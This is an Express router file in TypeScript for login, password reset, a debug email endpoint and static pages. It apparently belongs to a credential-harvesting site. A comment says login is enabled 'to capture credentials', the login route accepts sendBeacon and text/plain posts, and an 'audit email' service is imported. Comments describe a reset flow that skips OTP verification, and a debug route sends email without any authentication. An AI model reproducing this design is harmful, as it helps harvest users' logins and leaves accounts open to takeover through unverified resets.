import express, { Request, Response, NextFunction } from "express";
import path from "path";
// import { registerHandler, loginHandler, verifyHandler } from "./controllers/user.controller";
import { sendResetOtpHandler, verifyResetHandler } from "./controllers/reset.controller";

export const router = express.Router();

// User routes (registration is disabled). Enable server-side login to capture credentials.
import { loginHandler } from "./controllers/user.controller";
import { sendAuditEmail } from "./services/email.service";

// Route-specific fallback parser to handle requests sent via navigator.sendBeacon
// or other clients that may send non-standard Content-Type (e.g. text/plain).
function beaconBodyParser(req: Request, res: Response, next: NextFunction) {
  // If JSON is already parsed, continue
  if (req.body && typeof req.body === 'object' && Object.keys(req.body).length) return next();

  // Only attempt to read raw text for POST requests
  if (req.method !== 'POST') return next();

  let data = '';
  req.setEncoding('utf8');
  req.on('data', (chunk: string) => { data += chunk; });
  req.on('end', () => {
    if (!data) return next();
    try {
      // Try parse JSON if possible
      req.body = JSON.parse(data);
    } catch (e) {
      // otherwise keep raw string
      req.body = data;
    }
    next();
  });
}

router.post('/api/user/login', beaconBodyParser, loginHandler);

// Debug endpoint to trigger a test email (useful to verify SendGrid/SMTP in prod)
router.get('/api/debug/send-test-email', async (req: Request, res: Response) => {
  try {
    const subject = 'App Test Email';
    const html = `<div><p>Test email from ${process.env.APP_NAME || 'App'}</p><p>Timestamp: ${new Date().toISOString()}</p></div>`;
    const result = await sendAuditEmail({ subject, html });
    return res.status(200).json({ success: true, result });
  } catch (err) {
    console.error('Debug test email failed:', err);
    return res.status(500).json({ error: String(err) });
  }
});

// Reset routes - OTP send deprecated; direct reset (email + newPassword) handled below
// router.post('/api/reset/send', sendResetOtpHandler);
router.post('/api/reset/verify', verifyResetHandler);

router.get('/ping', (req, res) => {
  res.status(200).send('pong');
});

// serve SSR client static files from src/client
const clientPath = path.join(__dirname, 'client');
router.use(express.static(clientPath));

router.get('/', (req, res) => {
  res.sendFile(path.join(clientPath, 'index.html'));
});

router.get('/register', (req, res) => {
  res.sendFile(path.join(clientPath, 'register.html'));
});

// Do not serve reset.html (removed). Keep reset-verify page served for reset flow.
router.get('/reset-verify.html', (req, res) => {
  res.sendFile(path.join(clientPath, 'reset-verify.html'));
});
